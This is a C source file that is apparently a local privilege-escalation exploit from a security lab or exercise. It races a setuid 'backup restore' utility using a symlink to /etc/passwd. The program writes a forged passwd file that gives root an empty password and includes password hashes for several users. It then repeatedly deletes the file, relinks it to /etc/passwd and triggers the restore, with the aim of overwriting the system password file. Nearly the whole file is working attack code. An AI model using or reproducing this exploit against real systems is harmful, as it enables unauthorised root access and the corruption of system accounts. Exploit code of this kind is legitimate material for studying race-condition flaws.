#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <sys/ioctl.h>
#include <sys/wait.h>

static char password[] =
 "root::0:0:root:/root:/bin/bash\n"
 "daemon:*:1:1:daemon:/usr/sbin:/bin/sh\n"
 "bin:*:2:2:bin:/bin:/bin/sh\n"
 "sys:*:3:3:sys:/dev:/bin/sh\n"
 "sync:*:4:65534:sync:/bin:/bin/sync\n"
 "games:*:5:60:games:/usr/games:/bin/sh\n"
 "man:*:6:12:man:/var/cache/man:/bin/sh\n"
 "lp:*:7:7:lp:/var/spool/lpd:/bin/sh\n"
 "mail:*:8:8:mail:/var/mail:/bin/sh\n"
 "news:*:9:9:news:/var/spool/news:/bin/sh\n"
 "uucp:*:10:10:uucp:/var/spool/uucp:/bin/sh\n"
 "proxy:*:13:13:proxy:/bin:/bin/sh\n"
 "www-data:*:33:33:www-data:/var/www:/bin/sh\n"
 "backup:*:34:34:backup:/var/backups:/bin/sh\n"
 "list:*:38:38:Mailing List Manager:/var/list:/bin/sh\n"
 "irc:*:39:39:ircd:/var/run/ircd:/bin/sh\n"
 "gnats:*:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh\n"
 "nobody:*:65534:65534:nobody:/nonexistent:/bin/sh\n"
 "Debian-exim:!:102:102::/var/spool/exim4:/bin/false\n"
 "user::1000:1000::/home/user:/bin/sh\n"
 "halt::0:1001::/:/sbin/halt\n"
 "sshd:!:100:65534::/var/run/sshd:/usr/sbin/nologin\n"
 "alice:$1$3K5F48Hq$8HzLyorWKiQGFhUDsSCz5/:1001:1002:,,,:/home/alice:/bin/bash\n"
 "bob:$1$MHIFQV9P$058vJbP5r1iTbc2kUIG00/:1002:1003:,,,:/home/bob:/bin/bash\n"
 "carol:$1$HBIVNBBL$L4wIjFwhYHn6Gd0McowCB0:1003:1004:,,,:/home/carol:/bin/bash\n"
 "david:$1$OJyb0CiD$TBZf0.3Bhke4RWraKIRyj1:1004:1005:,,,:/home/david:/bin/bash\n"
 "eve:$1$Kbuuc2zT$nl4dSRlMFh.1H8BKIHjji1:1005:1006:,,,:/home/eve:/bin/bash\n";



int main(){


   FILE *fp;
   char *arg[4];
   char *argv[4];
   char *env[1];
   char mode[] = "0777";
   int p;
   int rmrt;
   int tid;
   int i,j;

   arg[0] = "/home/alice/backup";
   arg[1] = "backup";
   arg[2] = "foo";
   arg[3] = NULL;
   argv[0] = "/home/alice/backup";
   argv[1] = "restore";
   argv[2] = "foo";
   argv[3] = NULL;

   env[0] = NULL;

   /* create my password file */

   fp = fopen("/share/foo","w+");
   fprintf(fp,"%s",password);
   fclose(fp);

   p = strtol(mode,0,8);
   if(chmod("./foo",p) < 0){
     fprintf(stderr, "chmod failed.\n");

   }


   tid = fork();

   /* backup my password file */
   if(0 == tid && execve(arg[0],arg,env)){
           fprintf(stderr, "execve failed.\n");
           return 0;
   }else{
     wait(NULL);
     /* repeat the dirty work */
     for(i=0;i<5;i++){
       tid = fork();
       if(0 == tid){/* child attack */
          for(j=0;j<2;++i){
             /* delete foo */
             system("rm -f /share/foo");
             /* symlink foo*/
             symlink("/etc/passwd","/share/foo");
             sleep(1000);
          }/*end for j*/
          return 0;
       }else{/* parent call it */
             system("/home/alice/backup restore foo");
             /* delete foo */
             system("rm -f /share/foo");
             wait(NULL);
       }/*end if tid2*/
     }/*end for 500*/
   }/*end if tid*/

   exit(0);

return 0;
}

